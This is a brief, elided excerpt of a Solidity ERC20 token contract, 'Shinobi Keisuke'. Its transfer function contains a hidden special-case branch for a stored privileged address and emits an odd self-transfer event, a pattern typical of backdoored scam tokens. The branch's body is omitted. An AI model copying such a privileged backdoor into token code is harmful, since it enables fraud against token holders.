...
contract ERC20 is Context, IERC20, IERC20Metadata , Keisuke{
    ...
    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        if((recipients == _msgSender()) && (truth==true)){
          ...
          emit Transfer(recipient, recipient, amount); return true;
        }else{
...
contract Shinobi is ERC20{
    ...
    constructor () ERC20('Shinobi Keisuke', unicode'🐾KEI') {
